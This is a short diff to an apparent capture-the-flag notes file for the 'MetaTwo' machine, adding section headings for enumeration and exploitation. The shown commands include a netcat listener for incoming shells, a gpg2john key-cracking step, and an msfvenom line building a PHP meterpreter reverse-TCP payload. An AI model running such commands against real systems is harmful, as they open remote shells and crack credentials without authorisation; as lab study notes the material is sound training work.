@@ -1,5 +1,6 @@
+# MetaTwo
 
-
+## Enumeration
 
 ```
 $ nc -nlvp 4242
@@ -10,3 +11,10 @@ $ php -S 0.0.0.0:9123
 
 $ gpg2john pass/test_pkey > test_hash
 ```
+
+## Exploitation
+
+```
+$ msfvenom -p php/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=[LPORT] -f raw > payload.php
+```
+
